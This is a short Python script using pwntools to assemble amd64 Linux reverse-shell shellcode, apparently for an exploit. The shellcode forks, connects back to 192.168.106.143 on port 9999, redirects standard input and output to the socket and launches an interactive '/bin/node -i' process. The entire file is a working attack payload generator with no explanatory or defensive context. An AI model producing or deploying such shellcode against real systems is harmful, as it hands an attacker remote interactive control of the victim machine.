from pwn import *

context.arch = 'amd64'

def reverseshell(host,port):
  code  = ''
  code += pwnlib.shellcraft.amd64.linux.forkexit()
  code += pwnlib.shellcraft.amd64.linux.connect(host, port)
  code += '\n\n'
  code += pwnlib.shellcraft.amd64.linux.dup2('rbp',0)
  code += pwnlib.shellcraft.amd64.linux.dup2('rbp',1)
  code += pwnlib.shellcraft.amd64.linux.dup2('rbp',2)

  code += '''
    /* push b'/bin/node\x00' */
    sub rsp, 0x10
    mov dword ptr[rsp], 0x6e69622f
    mov dword ptr[rsp+4], 0x646f6e2f
    mov dword ptr[rsp+8], 0x65
    mov rax, rsp

    /* push b'-i\x00' */
    sub rsp, 0x8
    mov dword ptr[rsp], 0x692d
    mov rbx, rsp

    mov rdi, rax

    push 0
    push rbx
    push rax
    mov rsi, rsp

    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
'''

  #print(code)
  shellcode = asm(code)
  return shellcode

def main():
  print(reverseshell('192.168.106.143',9999))

if __name__ == '__main__':
  main()
